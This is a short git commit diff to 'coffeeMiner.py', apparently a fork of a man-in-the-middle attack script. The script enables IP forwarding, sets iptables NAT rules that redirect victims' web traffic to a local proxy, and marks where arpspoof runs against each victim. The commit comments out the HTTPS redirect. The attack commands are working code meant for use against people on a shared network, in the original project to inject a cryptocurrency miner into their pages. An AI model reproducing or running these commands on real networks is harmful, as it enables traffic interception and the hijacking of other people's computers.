7f9da2a80caa94de5ccb992e58f6d062ba7b0bb8
Robert Balogh <balogh.robert@trconsult.local>
2018-01-16 15:25:36 +0100

    v1

--- coffeeMiner.py
+++ coffeeMiner.py
@@ -46,7 +46,8 @@ attacker_ip = get_ip_address(interface)
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 os.system("iptables -t nat -A POSTROUTING -o " + interface + " -j MASQUERADE")
 os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
-os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
+#os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
+
 
 
 # run the arpspoof for each victim, each one in a new console
